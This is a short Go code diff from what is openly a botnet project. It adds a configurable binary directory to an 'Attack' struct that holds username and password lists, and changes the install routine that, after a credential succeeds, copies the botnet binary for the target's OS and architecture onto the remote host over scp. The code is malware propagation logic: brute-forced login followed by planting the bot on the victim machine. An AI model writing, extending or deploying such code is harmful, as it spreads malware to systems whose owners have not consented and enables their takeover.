@@ -18,6 +18,8 @@ type Attack struct {
 	UsernameFile string
 	// PasswordFileis the path to password file
 	PasswordFile string
+	// BinDir the location where the botnet binaries are
+	BinDir string
 
 	wg *sync.WaitGroup
 }
@@ -127,9 +129,9 @@ func (a *Attack) install(c *credential) {
 		return
 	}
 
-	path := fmt.Sprintf("/Users/rodrigo/work/src/gitlab.com/rodzzlessa24/botnet/bin/%s/botnet", nodeOS)
+	path := fmt.Sprintf("%s/%s/botnet", a.BinDir, nodeOS)
 	if nodeOS == "linux" {
-		path = fmt.Sprintf("/Users/rodrigo/work/src/gitlab.com/rodzzlessa24/botnet/bin/%s/%s/botnet", nodeOS, arch)
+		path = fmt.Sprintf("%s/%s/%s/botnet", a.BinDir, nodeOS, arch)
 	}
 
 	if err := scp(path, strings.TrimSpace(string(out))+"/botnet/bin", sess); err != nil {
